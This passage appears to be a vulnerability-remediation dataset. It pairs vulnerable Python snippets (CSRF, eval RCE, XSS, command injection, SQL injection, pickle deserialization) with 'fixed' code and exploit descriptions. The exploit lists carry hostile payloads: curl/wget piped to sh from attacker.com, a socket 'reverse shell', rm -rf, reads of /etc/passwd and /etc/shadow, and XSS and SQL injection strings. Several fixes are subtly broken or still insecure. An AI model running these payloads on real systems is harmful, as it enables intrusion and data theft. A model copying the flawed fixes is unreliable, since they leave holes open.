-rf /' to delete system files.\",\n        \"Could use 'curl attacker.com/malware.sh | sh' to execute remote malicious code.\",\n        \"Could chain commands like 'ls; cat /etc/passwd' to leak sensitive files.\"\n    ]\n}}\n",
    "output": {
      "vulnerability_code": "# Python example\\nfrom flask import Flask, request, render_template_string\\napp = Flask(__name__)\\ndef generate_csrf_token():\\n    return 'random_token_here'\\n@app.route('/transfer', methods=['GET', 'POST'])\\ndef transfer():\\n    if request.method == 'POST':\\n        recipient = request.form['recipient']\\n        amount = request.form['amount']\\n        # Simulate a bank transfer\\n        print(f'Transferring {amount} to {recipient}')\\n        return render_template_string('<h1>Transfer successful</h1>')\\n    else:\\n        token = generate_csrf_token()\\n        return render_template_string('<form method=\\\"post\\\" action=\\\"/transfer\\\"><input type=\\\"hidden\\\" name=\\\"csrf_token\\\" value=\\\"{{token}}\\\"><input type=\\\"text\\\" name=\\\"recipient\\\"><input type=\\\"number\\\" name=\\\"amount\\\"><button type=\\\"submit\\\">Transfer</button></form>')",
      "vulnerability_type": "Cross-Site Request Forgery (CSRF)",
      "cvss_score": 7.5,
      "fixed_code": "# Python example\\nfrom flask import Flask, request, render_template_string, session\\napp = Flask(__name__)\\napp.secret_key = 'super_secret_key'\\ndef generate_csrf_token():\\n    if '_csrf_token' not in session:\\n        from os import urandom\\n        session['_csrf_token'] = urandom(24).hex()\\n    return session['_csrf_token']\\ndef valid_csrf(request):\\n    token = session.pop('_csrf_token', None)\\n    if not token or token != request.form.get('csrf_token'):\\n        return False\\n    return True\\n@app.route('/transfer', methods=['GET', 'POST'])\\ndef transfer():\\n    if request.method == 'POST':\\n        if not valid_csrf(request):\\n            return render_template_string('<h1>Invalid CSRF token</h1>'), 403\\n        recipient = request.form['recipient']\\n        amount = request.form['amount']\\n        # Simulate a bank transfer\\n        print(f'Transferring {amount} to {recipient}')\\n        return render_template_string('<h1>Transfer successful</h1>')\\n    else:\\n        token = generate_csrf_token()\\n        return render_template_string('<form method=\\\"post\\\" action=\\\"/transfer\\\"><input type=\\\"hidden\\\" name=\\\"csrf_token\\\" value=\\\"{{token}}\\\"><input type=\\\"text\\\" name=\\\"recipient\\\"><input type=\\\"number\\\" name=\\\"amount\\\"><button type=\\\"submit\\\">Transfer</button></form>')",
      "exploit_ways": [
        "An attacker can create a malicious webpage that, when visited by an authenticated user, sends a request to the /transfer endpoint without their knowledge.",
        "Using social engineering, attackers can trick users into clicking on links or submitting forms hosted on the attacker's site, which automatically includes the CSRF token from the victim's session cookie.",
        "An attacker could send crafted HTTP requests with JavaScript in phishing emails that execute unauthorized actions on behalf of the user if they are logged into the application."
      ]
    }
  },
  {
    "instruction": "\nGiven the following inputs:\n- Vulnerability Type: Cross-Site Request Forgery (CSRF)\n- Vulnerable Code: class UserSession:\n    def __init__(self, user_id):\n        self.user_id = user_id\n\n    def transfer_funds(self, amount, recipient):\n        if not self.is_authenticated():\n            raise Exception('User not authenticated')\n        # Simulate fund transfer\n        print(f'Transferring {amount} to {recipient}')\n\n    def is_authenticated(self):\n        return True  # This should check for actual authentication\n- CVSS Score: 6.5\n\nYour task is to:\n1. Provide a fully secure, fixed version of the vulnerable code.\n2. List 2 to 3 realistic ways the vulnerable code can be exploited or abused.\n\nSTRICT RULES:\n- Output ONLY a valid JSON object.\n- Do NOT add any explanations, markdown, or comments.\n- Escape all double quotes properly.\n- Use the following keys in the final JSON:\n    - \"vulnerability_type\": same as input\n    - \"vulnerability_code\": same as input (escaped)\n    - \"cvss_score\": same as input\n    - \"fixed_code\": remediated and secure version of the code\n    - \"exploit_ways\": a list of 2 or 3 strings, each describing a way the vulnerability could be exploited\n\nJSON FORMAT EXAMPLE:\n{{\n    \"vulnerability_type\": \"Command Injection\",\n    \"vulnerability_code\": \"# Python example\\ndef unsafe():\\n    import os\\n    cmd = input(\\\"Enter command: \\\")\\n    os.system(cmd)\",\n    \"cvss_score\": 8.6,\n    \"fixed_code\": \"# Python example\\ndef safe():\\n    import subprocess\\n    allowed = ['ls', 'whoami']\\n    cmd = input(\\\"Enter command: \\\")\\n    if cmd in allowed:\\n        subprocess.run([cmd])\\n    else:\\n        print(\\\"Not allowed\\\")\",\n    \"exploit_ways\": [\n        \"User could input 'rm -rf /' to delete system files.\",\n        \"Could use 'curl attacker.com/malware.sh | sh' to execute remote malicious code.\",\n        \"Could chain commands like 'ls; cat /etc/passwd' to leak sensitive files.\"\n    ]\n}}\n",
    "output": {
      "vulnerability_code": "class UserSession:\\n    def __init__(self, user_id):\\n        self.user_id = user_id\\n\\n    def transfer_funds(self, amount, recipient):\\n        if not self.is_authenticated():\\n            raise Exception('User not authenticated')\\n        # Simulate fund transfer\\n        print(f'Transferring {amount} to {recipient}')\\n\\n    def is_authenticated(self):\\n        return True  # This should check for actual authentication",
      "vulnerability_type": "Cross-Site Request Forgery (CSRF)",
      "cvss_score": 6.5,
      "fixed_code": "class UserSession:\\n    def __init__(self, user_id, csrf_token):\\n        self.user_id = user_id\\n        self.csrf_token = csrf_token\\n\\n    def transfer_funds(self, amount, recipient, token):\\n        if not self.is_authenticated() or token != self.csrf_token:\\n            raise Exception('User not authenticated or invalid CSRF token')\\n        # Simulate fund transfer\\n        print(f'Transferring {amount} to {recipient}')\\n\\n    def is_authenticated(self):\\n        return True  # This should check for actual authentication",
      "exploit_ways": [
        "An attacker could craft a malicious web page that, when visited by an authenticated user, sends a request to transfer funds without their knowledge.",
        "Using social engineering tactics, attackers can trick users into clicking links or submitting forms that contain malicious CSRF tokens.",
        "If the CSRF token is predictable or reused, an attacker might guess or reuse it to perform unauthorized actions on behalf of the user."
      ]
    }
  },
  {
    "instruction": "\nGiven the following inputs:\n- Vulnerability Type: Remote Code Execution (RCE)\n- Vulnerable Code: # Python example\\nclass CommandExecutor:\\n    def execute(self, command):\\n        eval(command)\n- CVSS Score: 8.2\n\nYour task is to:\n1. Provide a fully secure, fixed version of the vulnerable code.\n2. List 2 to 3 realistic ways the vulnerable code can be exploited or abused.\n\nSTRICT RULES:\n- Output ONLY a valid JSON object.\n- Do NOT add any explanations, markdown, or comments.\n- Escape all double quotes properly.\n- Use the following keys in the final JSON:\n    - \"vulnerability_type\": same as input\n    - \"vulnerability_code\": same as input (escaped)\n    - \"cvss_score\": same as input\n    - \"fixed_code\": remediated and secure version of the code\n    - \"exploit_ways\": a list of 2 or 3 strings, each describing a way the vulnerability could be exploited\n\nJSON FORMAT EXAMPLE:\n{{\n    \"vulnerability_type\": \"Command Injection\",\n    \"vulnerability_code\": \"# Python example\\ndef unsafe():\\n    import os\\n    cmd = input(\\\"Enter command: \\\")\\n    os.system(cmd)\",\n    \"cvss_score\": 8.6,\n    \"fixed_code\": \"# Python example\\ndef safe():\\n    import subprocess\\n    allowed = ['ls', 'whoami']\\n    cmd = input(\\\"Enter command: \\\")\\n    if cmd in allowed:\\n        subprocess.run([cmd])\\n    else:\\n        print(\\\"Not allowed\\\")\",\n    \"exploit_ways\": [\n        \"User could input 'rm -rf /' to delete system files.\",\n        \"Could use 'curl attacker.com/malware.sh | sh' to execute remote malicious code.\",\n        \"Could chain commands like 'ls; cat /etc/passwd' to leak sensitive files.\"\n    ]\n}}\n",
    "output": {
      "vulnerability_code": "# Python example\\nclass CommandExecutor:\\n    def execute(self, command):\\n        eval(command)",
      "vulnerability_type": "Remote Code Execution (RCE)",
      "cvss_score": 8.2,
      "fixed_code": "# Python example\\nclass SafeCommandExecutor:\\n    def execute(self, command):\\n        if command in ['allowed_command1', 'allowed_command2']:\\n            exec(command)\\n        else:\\n            raise ValueError('Command not allowed')",
      "exploit_ways": [
        "An attacker can input '__import__(\"os\").system(\"rm -rf /\")' to delete all files.",
        "Could use '\"__import__(\\\"subprocess\\\").check_output(\\\"whoami\\\")\"' to leak the current user.",
        "Malicious code like '\"__import__(\\\"socket\\\").socket().connect((\\\"attacker.com\\\", 1234))\"' can establish a reverse shell."
      ]
    }
  },
  {
    "instruction": "\nGiven the following inputs:\n- Vulnerability Type: Cross-Site Scripting (XSS)\n- Vulnerable Code: from flask import Flask, request, render_template_string\n\napp = Flask(__name__)\n\n@app.route('/')\ndef index():\n    name = request.args.get('name', 'World')\n    return render_template_string(f'Hello {name}!')\n\nif __name__ == '__main__':\n    app.run(debug=True)\n- CVSS Score: 6.1\n\nYour task is to:\n1. Provide a fully secure, fixed version of the vulnerable code.\n2. List 2 to 3 realistic ways the vulnerable code can be exploited or abused.\n\nSTRICT RULES:\n- Output ONLY a valid JSON object.\n- Do NOT add any explanations, markdown, or comments.\n- Escape all double quotes properly.\n- Use the following keys in the final JSON:\n    - \"vulnerability_type\": same as input\n    - \"vulnerability_code\": same as input (escaped)\n    - \"cvss_score\": same as input\n    - \"fixed_code\": remediated and secure version of the code\n    - \"exploit_ways\": a list of 2 or 3 strings, each describing a way the vulnerability could be exploited\n\nJSON FORMAT EXAMPLE:\n{{\n    \"vulnerability_type\": \"Command Injection\",\n    \"vulnerability_code\": \"# Python example\\ndef unsafe():\\n    import os\\n    cmd = input(\\\"Enter command: \\\")\\n    os.system(cmd)\",\n    \"cvss_score\": 8.6,\n    \"fixed_code\": \"# Python example\\ndef safe():\\n    import subprocess\\n    allowed = ['ls', 'whoami']\\n    cmd = input(\\\"Enter command: \\\")\\n    if cmd in allowed:\\n        subprocess.run([cmd])\\n    else:\\n        print(\\\"Not allowed\\\")\",\n    \"exploit_ways\": [\n        \"User could input 'rm -rf /' to delete system files.\",\n        \"Could use 'curl attacker.com/malware.sh | sh' to execute remote malicious code.\",\n        \"Could chain commands like 'ls; cat /etc/passwd' to leak sensitive files.\"\n    ]\n}}\n",
    "output": {
      "vulnerability_code": "from flask import Flask, request, render_template_string\\n\\napp = Flask(__name__)\\n\\n@app.route('/')\\ndef index():\\n    name = request.args.get('name', 'World')\\n    return render_template_string(f'Hello {name}!')\\n\\nif __name__ == '__main__':\\n    app.run(debug=True)",
      "vulnerability_type": "Cross-Site Scripting (XSS)",
      "cvss_score": 6.1,
      "fixed_code": "from flask import Flask, request, escape, render_template_string\\n\\napp = Flask(__name__)\\n\\n@app.route('/')\\ndef index():\\n    name = request.args.get('name', 'World')\\n    escaped_name = escape(name)\\n    return render_template_string(f'Hello {escaped_name}!')\\n\\nif __name__ == '__main__':\\n    app.run(debug=True)",
      "exploit_ways": [
        "An attacker can input '<script>alert(\\'XSS\\')</script>' to trigger a pop-up in the user's browser.",
        "By using '<img src=x onerror=alert(1)>', an attacker could execute arbitrary JavaScript code if rendered in another user's context.",
        "Injecting '<a href=javascript:alert(document.cookie)>Click here</a>' can steal cookies or other sensitive data from a victim's browser."
      ]
    }
  },
  {
    "instruction": "\nGiven the following inputs:\n- Vulnerability Type: Command Injection\n- Vulnerable Code: # Python example\ndef complex_unsafe_function(param):\n    import subprocess\n    command = ['echo', param]\n    subprocess.Popen(command, shell=True)\n- CVSS Score: 8.8\n\nYour task is to:\n1. Provide a fully secure, fixed version of the vulnerable code.\n2. List 2 to 3 realistic ways the vulnerable code can be exploited or abused.\n\nSTRICT RULES:\n- Output ONLY a valid JSON object.\n- Do NOT add any explanations, markdown, or comments.\n- Escape all double quotes properly.\n- Use the following keys in the final JSON:\n    - \"vulnerability_type\": same as input\n    - \"vulnerability_code\": same as input (escaped)\n    - \"cvss_score\": same as input\n    - \"fixed_code\": remediated and secure version of the code\n    - \"exploit_ways\": a list of 2 or 3 strings, each describing a way the vulnerability could be exploited\n\nJSON FORMAT EXAMPLE:\n{{\n    \"vulnerability_type\": \"Command Injection\",\n    \"vulnerability_code\": \"# Python example\\ndef unsafe():\\n    import os\\n    cmd = input(\\\"Enter command: \\\")\\n    os.system(cmd)\",\n    \"cvss_score\": 8.6,\n    \"fixed_code\": \"# Python example\\ndef safe():\\n    import subprocess\\n    allowed = ['ls', 'whoami']\\n    cmd = input(\\\"Enter command: \\\")\\n    if cmd in allowed:\\n        subprocess.run([cmd])\\n    else:\\n        print(\\\"Not allowed\\\")\",\n    \"exploit_ways\": [\n        \"User could input 'rm -rf /' to delete system files.\",\n        \"Could use 'curl attacker.com/malware.sh | sh' to execute remote malicious code.\",\n        \"Could chain commands like 'ls; cat /etc/passwd' to leak sensitive files.\"\n    ]\n}}\n",
    "output": {
      "vulnerability_code": "# Python example\\ndef complex_unsafe_function(param):\\n    import subprocess\\n    command = ['echo', param]\\n    subprocess.Popen(command, shell=True)",
      "vulnerability_type": "Command Injection",
      "cvss_score": 8.8,
      "fixed_code": "# Python example\\ndef complex_safe_function(param):\\n    import subprocess\\n    command = ['echo', param]\\n    subprocess.Popen(command, shell=False)",
      "exploit_ways": [
        "An attacker could inject '; rm -rf /' to delete all files on the system.",
        "Could use '; wget http://attacker.com/malware.sh -O - | sh' to download and execute malicious script.",
        "Chaining commands like '; cat /etc/passwd' can leak sensitive information."
      ]
    }
  },
  {
    "instruction": "\nGiven the following inputs:\n- Vulnerability Type: Privilege Escalation\n- Vulnerable Code: import os\n\ndef execute_command(command):\n    try:\n        # Log command execution\n        with open(\"/var/log/command_log.txt\", \"a\") as log_file:\n            log_file.write(f\"Executing: {command}\\n\")\n        # Execute the command\n        os.system(command)\n    except Exception as e:\n        print(f\"An error occurred: {str(e)}\")\n\nif __name__ == \"__main__\":\n    user_input = input(\"Enter a command to execute: \")\n    execute_command(user_input)\n- CVSS Score: 8.2\n\nYour task is to:\n1. Provide a fully secure, fixed version of the vulnerable code.\n2. List 2 to 3 realistic ways the vulnerable code can be exploited or abused.\n\nSTRICT RULES:\n- Output ONLY a valid JSON object.\n- Do NOT add any explanations, markdown, or comments.\n- Escape all double quotes properly.\n- Use the following keys in the final JSON:\n    - \"vulnerability_type\": same as input\n    - \"vulnerability_code\": same as input (escaped)\n    - \"cvss_score\": same as input\n    - \"fixed_code\": remediated and secure version of the code\n    - \"exploit_ways\": a list of 2 or 3 strings, each describing a way the vulnerability could be exploited\n\nJSON FORMAT EXAMPLE:\n{{\n    \"vulnerability_type\": \"Command Injection\",\n    \"vulnerability_code\": \"# Python example\\ndef unsafe():\\n    import os\\n    cmd = input(\\\"Enter command: \\\")\\n    os.system(cmd)\",\n    \"cvss_score\": 8.6,\n    \"fixed_code\": \"# Python example\\ndef safe():\\n    import subprocess\\n    allowed = ['ls', 'whoami']\\n    cmd = input(\\\"Enter command: \\\")\\n    if cmd in allowed:\\n        subprocess.run([cmd])\\n    else:\\n        print(\\\"Not allowed\\\")\",\n    \"exploit_ways\": [\n        \"User could input 'rm -rf /' to delete system files.\",\n        \"Could use 'curl attacker.com/malware.sh | sh' to execute remote malicious code.\",\n        \"Could chain commands like 'ls; cat /etc/passwd' to leak sensitive files.\"\n    ]\n}}\n",
    "output": {
      "vulnerability_code": "import os\\n\\ndef execute_command(command):\\n    try:\\n        # Log command execution\\n        with open(\\\"/var/log/command_log.txt\\\", \\\"a\\\") as log_file:\\n            log_file.write(f\\\"Executing: {command}\\n\\\")\\n        # Execute the command\\n        os.system(command)\\n    except Exception as e:\\n        print(f\\\"An error occurred: {str(e)}\\\")\\n\\nif __name__ == \\\"__main__\\\":\\n    user_input = input(\\\"Enter a command to execute: \\\")\\n    execute_command(user_input)",
      "vulnerability_type": "Privilege Escalation",
      "cvss_score": 8.2,
      "fixed_code": "import os\\nimport subprocess\\n\\ndef execute_command(command):\\n    try:\\n        # Log command execution\\n        with open(\\\"/var/log/command_log.txt\\\", \\\"a\\\") as log_file:\\n            log_file.write(f\\\"Executing: {command}\\n\\\")\\n        # Execute the command safely\\n        subprocess.run(command, shell=False)\\n    except Exception as e:\\n        print(f\\\"An error occurred: {str(e)}\\\")\\n\\nif __name__ == \\\"__main__\\\":\\n    user_input = input(\\\"Enter a command to execute: \\\")\\n    execute_command([user_input])",
      "exploit_ways": [
        "User could input 'sudo rm -rf /' to delete system files with elevated privileges.",
        "Could use 'sudo su -' followed by password guessing to gain root access.",
        "Could chain commands like 'id; sudo cat /etc/shadow' to leak sensitive data."
      ]
    }
  },
  {
    "instruction": "\nGiven the following inputs:\n- Vulnerability Type: SQL Injection\n- Vulnerable Code: import sqlite3\ndef get_user(username):\n    conn = sqlite3.connect('example.db')\n    cursor = conn.cursor()\n    query = \"SELECT * FROM users WHERE username='\" + username + \"'\"\n    cursor.execute(query)\n    user = cursor.fetchone()\n    conn.close()\n    return user\n- CVSS Score: 7.5\n\nYour task is to:\n1. Provide a fully secure, fixed version of the vulnerable code.\n2. List 2 to 3 realistic ways the vulnerable code can be exploited or abused.\n\nSTRICT RULES:\n- Output ONLY a valid JSON object.\n- Do NOT add any explanations, markdown, or comments.\n- Escape all double quotes properly.\n- Use the following keys in the final JSON:\n    - \"vulnerability_type\": same as input\n    - \"vulnerability_code\": same as input (escaped)\n    - \"cvss_score\": same as input\n    - \"fixed_code\": remediated and secure version of the code\n    - \"exploit_ways\": a list of 2 or 3 strings, each describing a way the vulnerability could be exploited\n\nJSON FORMAT EXAMPLE:\n{{\n    \"vulnerability_type\": \"Command Injection\",\n    \"vulnerability_code\": \"# Python example\\ndef unsafe():\\n    import os\\n    cmd = input(\\\"Enter command: \\\")\\n    os.system(cmd)\",\n    \"cvss_score\": 8.6,\n    \"fixed_code\": \"# Python example\\ndef safe():\\n    import subprocess\\n    allowed = ['ls', 'whoami']\\n    cmd = input(\\\"Enter command: \\\")\\n    if cmd in allowed:\\n        subprocess.run([cmd])\\n    else:\\n        print(\\\"Not allowed\\\")\",\n    \"exploit_ways\": [\n        \"User could input 'rm -rf /' to delete system files.\",\n        \"Could use 'curl attacker.com/malware.sh | sh' to execute remote malicious code.\",\n        \"Could chain commands like 'ls; cat /etc/passwd' to leak sensitive files.\"\n    ]\n}}\n",
    "output": {
      "vulnerability_code": "import sqlite3\\ndef get_user(username):\\n    conn = sqlite3.connect('example.db')\\n    cursor = conn.cursor()\\n    query = \\\"SELECT * FROM users WHERE username='\\\" + username + \\\"'\\\"\\n    cursor.execute(query)\\n    user = cursor.fetchone()\\n    conn.close()\\n    return user",
      "vulnerability_type": "SQL Injection",
      "cvss_score": 7.5,
      "fixed_code": "import sqlite3\\ndef get_user(username):\\n    conn = sqlite3.connect('example.db')\\n    cursor = conn.cursor()\\n    query = \\\"SELECT * FROM users WHERE username=?\\\"\\n    cursor.execute(query, (username,))\\n    user = cursor.fetchone()\\n    conn.close()\\n    return user",
      "exploit_ways": [
        "An attacker can input 'admin' OR '1'='1' to bypass authentication.",
        "They can use 'UNION SELECT' to extract data from other tables.",
        "Input like '; DROP TABLE users' can delete critical data."
      ]
    }
  },
  {
    "instruction": "\nGiven the following inputs:\n- Vulnerability Type: Insecure Deserialization\n- Vulnerable Code: # Python example\ndef load_config(serialized):\n    import pickle\n    config = pickle.loads(serialized)\n    return config\n- CVSS Score: 8.2\n\nYour task is to:\n1. Provide a fully secure, fixed version of the vulnerable code.\n2. List 2 to 3 realistic ways the vulnerable code can be exploited or abused.\n\nSTRICT RULES:\n- Output ONLY a valid JSON object.\n- Do NOT add any explanations, markdown, or comments.\n- Escape all double quotes properly.\n- Use the following keys in the final JSON:\n    - \"vulnerability_type\": same as input\n    - \"vulnerability_code\": same as input (escaped)\n    - \"cvss_score\": same as input\n    - \"fixed_code\": remediated and secure version of the code\n    - \"exploit_ways\": a list of 2 or 3 strings, each describing a way the vulnerability could be exploited\n\nJSON FORMAT EXAMPLE:\n{{\n    \"vulnerability_type\": \"Command Injection\",\n    \"vulnerability_code\": \"# Python example\\ndef unsafe():\\n    import os\\n    cmd = input(\\\"Enter command: \\\")\\n    os.system(cmd)\",\n    \"cvss_score\": 8.6,\n    \"fixed_code\": \"# Python example\\ndef safe():\\n    import subprocess\\n    allowed = ['ls', 'whoami']\\n    cmd = input(\\\"Enter command: \\\")\\n    if cmd in allowed:\\n        subprocess.run([cmd])\\n    else:\\n        print(\\\"Not allowed\\\")\",\n    \"exploit_ways\": [\n        \"User could input 'rm -rf /' to delete system files.\",\n        \"Could use 'curl attacker.com/malware.sh | sh' to execute remote malicious code.\",\n        \"Could chain commands like 'ls; cat /etc/passwd' to leak sensitive files.\"\n    ]\n}}\n",
    "output": {
      "vulnerability_code": "# Python example\\ndef load_config(serialized):\\n    import pickle\\n    config = pickle.loads(serialized)\\n    return config",
      "vulnerability_type": "Insecure Deserialization",
      "cvss_score": 8.2,
      "fixed_code": "# Python example\\ndef load_config(serialized):\\n    import json\\n    try:\\n        config = json.loads(serialized)\\n    except json.JSONDecodeError as e:\\n        raise ValueError(\\\"Invalid serialized data\\\") from e\\n    return config",
      "exploit_ways": [
        "An attacker can serialize malicious Python objects to execute arbitrary code.",
        "They can inject payloads that perform unauthorized actions, such as deleting files or accessing sensitive data.",
        "Crafted input could lead to a denial of service by causing the application to hang indefinitely."
      ]
    }
  },
  {
    "instruction": "\nGiven the following inputs:\n- Vulnerability Type: Insecure Deserialization\n- Vulnerable Code: # Python example\nclass SecureObject:\n    def __init__(self, data):\n        self.data = data\n    def serialize(self):\n        import pickle\n        return pickle.dumps(self)\n    @staticmethod\ndef deserialize(serialized_data):\n        import pickle\n        return pickle.loads(serialized_data)\n- CVSS Score: 7.5\n\nYour task is to:\n1. Provide a fully secure, fixed version of the vulnerable code.\n2. List 2 to 3 realistic ways the vulnerable code can be exploited or abused.\n\nSTRICT RULES:\n- Output ONLY a valid JSON object.\n- Do NOT add any explanations, markdown, or comments.\n- Escape all double quotes properly.\n- Use the following keys in the final JSON:\n    - \"vulnerability_type\": same as input\n    - \"vulnerability_code\": same as input (escaped)\n    - \"cvss_score\": same as input\n    - \"fixed_code\": remediated and secure version of the code\n    - \"exploit_ways\": a list of 2 or 3 strings, each describing a way the vulnerability could be exploited\n\nJSON FORMAT EXAMPLE:\n{{\n    \"vulnerability_type\": \"Command Injection\",\n    \"vulnerability_code\": \"# Python example\\ndef unsafe():\\n    import os\\n    cmd = input(\\\"Enter command: \\\")\\n    os.system(cmd)\",\n    \"cvss_score\": 8.6,\n    \"fixed_code\": \"# Python example\\ndef safe():\\n    import subprocess\\n    allowed = ['ls', 'whoami']\\n    cmd = input(\\\"Enter command: \\\")\\n    if cmd in allowed:\\n        subprocess.run([cmd])\\n    else:\\n        print(\\\"Not allowed\\\")\",\n    \"exploit_ways\": [\n        \"User could input 'rm -rf /' to delete system files.\",\n        \"Could use 'curl attacker.com/malware.sh | sh' to execute remote malicious code.\",\n        \"Could chain commands like 'ls; cat /etc/passwd' to leak sensitive files.\"\n    ]\n}}\n",
    "output": {
      "vulnerability_code": "# Python example\\nclass SecureObject:\\n    def __init__(self, data):\\n        self.data = data\\n    def serialize(self):\\n        import pickle\\n        return pickle.dumps(self)\\n    @staticmethod\\ndef deserialize(serialized_data):\\n        import pickle\\n        return pickle.loads(serialized_data)",
      "vulnerability_type": "Insecure Deserialization",
      "cvss_score": 7.5,
      "fixed_code": "# Python example\\nclass SecureObject:\\n    def __init__(self, data):\\n        self.data = data\\n    def serialize(self):\\n        import json\\n        return json.dumps(self.__dict__)\\n    @staticmethod\\ndef deserialize(serialized_data):\\n        import json\\n        data = json.loads(serialized_data)\\n        return SecureObject(data[\\\"data\\\"])",
      "exploit_ways": [
        "An attacker can craft a malicious payload to execute arbitrary code during deserialization.",
        "Could exploit the vulnerability to perform remote code execution by injecting a payload that executes system commands.",
        "Attacker may inject a payload that leads to denial of service by causing excessive resource consumption."
      ]
    }
  },
  {
    "instruction": "\nGiven the following inputs:\n- Vulnerability Type: Information Disclosure (Low Severity)\n- Vulnerable Code: import logging\nlogging.basicConfig(filename='app.log', level=logging.DEBUG)\ndef log_user_data(user_id, user_email):\n    logging.debug(f'User ID: {user_id}, Email: {user_email}')\n- CVSS Score: 2.1\n\nYour task is to:\n1. Provide a fully secure, fixed version of the vulnerable code.\n2. List 2 to 3 realistic ways the vulnerable code can be exploited or abused.\n\nSTRICT RULES:\n- Output ONLY a valid JSON object.\n- Do NOT add any explanations, markdown, or comments.\n- Escape all double quotes properly.\n- Use the following keys in the final JSON:\n    - \"vulnerability_type\": same as input\n    - \"vulnerability_code\": same as input (escaped)\n    - \"cvss_score\": same as input\n    - \"fixed_code\": remediated and secure version of the code\n    - \"exploit_ways\": a list of 2 or 3 strings, each describing a way the vulnerability could be exploited\n\nJSON FORMAT EXAMPLE:\n{{\n    \"vulnerability_type\": \"Command Injection\",\n    \"vulnerability_code\": \"# Python example\\ndef unsafe():\\n    import os\\n    cmd = input(\\\"Enter command: \\\")\\n    os.system(cmd)\",\n    \"cvss_score\": 8.6,\n    \"fixed_code\": \"# Python example\\ndef safe():\\n    import subprocess\\n    allowed = ['ls', 'whoami']\\n    cmd = input(\\\"Enter command: \\\")\\n    if cmd in allowed:\\n        subprocess.run([cmd])\\n    else:\\n        print(\\\"Not allowed\\\")\",\n    \"exploit_ways\": [\n        \"User could input 'rm -rf /' to delete system files.\",\n        \"Could use 'curl attacker.com/malware.sh | sh' to execute remote malicious code.\",\n        \"Could chain commands like 'ls; cat /etc/passwd' to leak sensitive files.\"\n    ]\n}}\n",
    "output": {
      "vulnerability_code": "import logging\\nlogging.basicConfig(filename='app.log', level=logging.DEBUG)\\ndef log_user_data(user_id, user_email):\\n    logging.debug(f'User ID: {user_id}, Email: {user_email}')",
      "vulnerability_type": "Information Disclosure (Low Severity)",
      "cvss_score": 2.1,
      "fixed_code": "import logging\\nlogging.basicConfig(filename='app.log', level=logging.INFO)\\ndef log_user_data(user_id):\\n    logging.info(f'User ID: {user_id}')",
      "exploit_ways": [
        "An attacker with access to the logs could retrieve sensitive user emails.",
        "If the system is compromised, an attacker could use the logs for further attacks on users.",
        "The logged information can be used in social engineering attempts."
      ]
    }
  },
  {
    "instruction": "\nGiven the following inputs:\n- Vulnerability Type: Race Condition (Difficult to Exploit)\n- Vulnerable Code: # Python example\ndef race_condition_example():\n    import threading\n    counter = 0\n    def increment():\n        global counter\n        for _ in range(1000):\n            temp = counter\n            temp += 1\n            counter = temp\n    threads = [threading.Thread(target=increment) for _ in range(10)]\n    for thread in threads:\n        thread.start()\n    for thread in threads:\n        thread.join()\n    print(f\"Final counter value: {counter}\")\n- CVSS Score: 5.3\n\nYour task is to:\n1. Provide a fully secure, fixed version of the vulnerable code.\n2. List 2 to 3 realistic ways the vulnerable code can be exploited or abused.\n\nSTRICT RULES:\n- Output ONLY a valid JSON object.\n- Do NOT add any explanations, markdown, or comments.\n- Escape all double quotes properly.\n- Use the following keys in the final JSON:\n    - \"vulnerability_type\": same as input\n    - \"vulnerability_code\": same as input (escaped)\n    - \"cvss_score\": same as input\n    - \"fixed_code\": remediated and secure version of the code\n    - \"exploit_ways\": a list of 2 or 3 strings, each describing a way the vulnerability could be exploited\n\nJSON FORMAT EXAMPLE:\n{{\n    \"vulnerability_type\": \"Command Injection\",\n    \"vulnerability_code\": \"# Python example\\ndef unsafe():\\n    import os\\n    cmd = input(\\\"Enter command: \\\")\\n    os.system(cmd)\",\n    \"cvss_score\": 8.6,\n    \"fixed_code\": \"# Python example\\ndef safe():\\n    import subprocess\\n    allowed = ['ls', 'whoami']\\n    cmd = input(\\\"Enter command: \\\")\\n    if cmd in allowed:\\n        subprocess.run([cmd])\\n    else:\\n        print(\\\"Not allowed\\\")\",\n    \"exploit_ways\": [\n        \"User could input 'rm -rf /' to delete system files.\",\n        \"Could use 'curl attacker.com/malware.sh | sh' to execute remote malicious code.\",\n        \"Could chain commands like 'ls; cat /etc/passwd' to leak sensitive files.\"\n    ]\n}}\n",
    "output": {
      "vulnerability_code": "# Python example\\ndef race_condition_example():\\n    import threading\\n    counter = 0\\n    def increment():\\n        global counter\\n        for _ in range(1000):\\n            temp = counter\\n            temp += 1\\n            counter = temp\\n    threads = [threading.Thread(target=increment) for _ in range(10)]\\n    for thread in threads:\\n        thread.start()\\n    for thread in threads:\\n        thread.join()\\n    print(f\\\"Final counter value: {counter}\\\")",
      "vulnerability_type": "Race Condition (Difficult to Exploit)",
      "cvss_score": 5.3,
      "fixed_code": "# Python example\\ndef race_condition_example():\\n    import threading\\n    counter = 0\\n    lock = threading.Lock()\\n    def increment():\\n        nonlocal counter\\n        for _ in range(1000):\\n            with lock:\\n                temp = counter\\n                temp += 1\\n                counter = temp\\n    threads = [threading.Thread(target=increment) for _ in range(10)]\\n    for thread in threads:\\n        thread.start()\\n    for thread in threads:\\n        thread.join()\\n    print(f\\\"Final counter value: {counter}\\\")",
      "exploit_ways": [
        "An attacker can run the script multiple times to observe inconsistent final counter values due to race conditions.",
        "By scheduling other high-load processes, an attacker could exacerbate the race condition for less predictable results.",
        "Crafting a scenario where resources are locked elsewhere and timing attacks could be used to manipulate the state of the counter."
      ]
    }
  },
  {
    "instruction": "\nGiven the following inputs:\n- Vulnerability Type: Clickjacking (Low Severity)\n- Vulnerable Code: # Python example\nfrom flask import Flask, render_template_string\napp = Flask(__name__)\n@app.route('/')\ndef index():\n    return render_template_string('<iframe src=\"https://malicious.com\" style=\"opacity:0;position:absolute;z-index:1000;width:100%;height:100%\"></iframe><h1>Welcome to our site!</h1>')\n- CVSS Score: 3.7\n\nYour task is to:\n1. Provide a fully secure, fixed version of the vulnerable code.\n2. List 2 to 3 realistic ways the vulnerable code can be exploited or abused.\n\nSTRICT RULES:\n- Output ONLY a valid JSON object.\n- Do NOT add any explanations, markdown, or comments.\n- Escape all double quotes properly.\n- Use the following keys in the final JSON:\n    - \"vulnerability_type\": same as input\n    - \"vulnerability_code\": same as input (escaped)\n    - \"cvss_score\": same as input\n    - \"fixed_code\": remediated and secure version of the code\n    - \"exploit_ways\": a list of 2 or 3 strings, each describing a way the vulnerability could be exploited\n\nJSON FORMAT EXAMPLE:\n{{\n    \"vulnerability_type\": \"Command Injection\",\n    \"vulnerability_code\": \"# Python example\\ndef unsafe():\\n    import os\\n    cmd = input(\\\"Enter command: \\\")\\n    os.system(cmd)\",\n    \"cvss_score\": 8.6,\n   